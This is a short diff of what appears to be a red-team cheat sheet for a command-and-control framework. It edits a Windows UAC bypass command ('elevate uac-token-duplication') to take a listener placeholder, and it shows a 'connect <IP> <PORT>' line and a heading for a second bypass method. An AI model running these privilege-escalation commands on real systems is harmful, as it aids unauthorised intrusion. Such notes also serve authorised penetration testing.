@@ -79,7 +79,7 @@ connect <IP> <PORT>
 
 #### UAC bypass method 1
 ```
-elevate uac-token-duplication tcp-4444-local
+elevate uac-token-duplication <LISTENER>
 ```
 
 #### UAC bypass method 2 runasadmin
